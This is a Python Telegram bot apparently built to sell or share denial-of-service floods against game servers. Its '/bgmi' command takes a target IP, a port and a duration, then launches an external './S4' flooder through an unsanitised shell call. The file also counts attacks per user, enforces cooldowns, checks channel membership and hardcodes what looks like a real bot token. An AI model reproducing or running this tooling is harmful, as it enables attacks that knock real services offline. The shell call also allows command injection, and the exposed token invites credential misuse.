import telebot
import subprocess
import datetime
import time
from datetime import timedelta
import re  # Regular expression for detecting links

from keep_alive import keep_alive
keep_alive()

# Bot initialization
BOT_TOKEN = "7826374051:AAF4X5XGzrWWEaiY7k9o-bjny-3iLXFK6Po"  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin IDs
admin_id = ["5454451480"]  # Replace with your Telegram user ID

# Group ID where feedback will be forwarded
GROUP_ID = "-4704129916"  # Replace with your group chat ID

# Channel ID to verify user membership
CHANNEL_ID = "@Eosjbsisjwwkia"  # Replace with your channel username

# File paths
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Constants
max_daily_attacks = 999  # Maximum allowed attacks per user per day
COOLDOWN_TIME = 240  # Cooldown time in seconds (4 minutes)
MUTE_DURATION = 3600  # Mute duration in seconds (1 hour)

# Variables
allowed_user_ids = []
user_attack_count = {}
last_attack_time = {}  # Track the time of the last attack for cooldown

# Load allowed users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log commands
def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except:
        username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        log_entry = f"Username: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration} seconds"
        file.write(log_entry + "\n\n")

# Check if a message contains a URL
def contains_url(text):
    url_pattern = r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+"
    return re.search(url_pattern, text) is not None

# Command: /JOIN (Admin only)
@bot.message_handler(commands=['join'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                bot.reply_to(message, f"User {user_to_add} has been added successfully.")
            else:
                bot.reply_to(message, "User is already added.")
        else:
            bot.reply_to(message, "Usage: /join <user_id>")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Command: /REMOVE (Admin only)
@bot.message_handler(commands=['kick'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                bot.reply_to(message, f"User {user_to_remove} has been removed successfully.")
            else:
                bot.reply_to(message, "User ID not found.")
        else:
            bot.reply_to(message, "Usage: /kick <user_id>")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Command: /bgmi (User attack with cooldown and limits)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        try:
            member = bot.get_chat_member(CHANNEL_ID, user_id)
            if member.status in ['member', 'administrator']:
                current_time = datetime.datetime.now()
                last_time = last_attack_time.get(user_id, None)

                if last_time:
                    time_diff = (current_time - last_time).total_seconds()
                    if time_diff < COOLDOWN_TIME:
                        remaining_time = COOLDOWN_TIME - time_diff
                        bot.reply_to(message, f"Cooldown active! Wait {int(remaining_time)} seconds.")
                        return

                attacks_today = user_attack_count.get(user_id, 0)
                if attacks_today >= max_daily_attacks:
                    bot.reply_to(message, "Daily attack limit reached. Try again tomorrow.")
                    return

                command = message.text.split()
                if len(command) != 4:
                    bot.reply_to(message, "Usage: /bgmi <target> <port> <duration>. Example: /bgmi 192.168.0.1 80 60")
                    return

                target, port, duration = command[1], int(command[2]), int(command[3])

                if duration > 240:
                    bot.reply_to(message, "Maximum allowed duration is 240 seconds.")
                    return

                log_command(user_id, target, port, duration)
                user_attack_count[user_id] = attacks_today + 1
                last_attack_time[user_id] = current_time

                bot.reply_to(message, f"Attack started on {target}:{port} for {duration} seconds.")
                subprocess.run(f"./S4 {target} {port} {duration}",  shell=True)

                bot.reply_to(message, "Attack completed successfully!")
            else:
                bot.reply_to(message, f"Please join the channel {CHANNEL_ID} to use this command.")
        except Exception as e:
            bot.reply_to(message, f"Error verifying membership: {e}")
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

# Mute users who send links
@bot.message_handler(func=lambda message: contains_url(message.text))
def mute_user_for_link(message):
    user_id = message.chat.id
    bot.reply_to(message, "You sent a link and will be muted for 1 hour.")
    bot.restrict_chat_member(message.chat.id, user_id, until_date=datetime.datetime.now() + timedelta(seconds=MUTE_DURATION))
    time.sleep(MUTE_DURATION)
    bot.unrestrict_chat_member(message.chat.id, user_id)

# Start polling
print("Bot is running...")
bot.infinity_polling()
